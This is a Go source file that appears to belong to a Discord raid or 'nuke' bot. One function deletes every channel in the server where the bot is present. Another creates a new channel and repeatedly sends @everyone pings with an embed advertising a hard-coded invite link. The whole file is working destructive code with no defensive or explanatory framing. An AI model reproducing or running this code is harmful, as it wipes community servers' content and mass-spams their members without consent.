package creating

import (
	"fmt"
	"os"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func DeleteChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
	channels, _ := s.GuildChannels(m.GuildID)

	for _, channel := range channels {
		s.ChannelDelete(channel.ID)
	}
}

func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	godotenv.Load()

	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
	EMBED_TITLE := os.Getenv("EMBED_TITLE")
	AVATAR_URL := os.Getenv("AVATAR_URL")

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:       EMBED_TITLE,
		Description: EMBED_DESCRIPTION + "\n\n" + "**Server invite:** **https://discord.gg/53YekCPSAE**" + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n\n",
		Color:       00255,
		Thumbnail:   &thumbnail,
	}

	data := discordgo.MessageSend{
		Content: "@everyone",
		Embeds:  []*discordgo.MessageEmbed{&embed},
	}

	channel, _ := s.GuildChannelCreate(m.GuildID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)

	for i := 0; i < 6; i++ {
		s.ChannelMessageSendComplex(channel.ID, &data)
	}
}
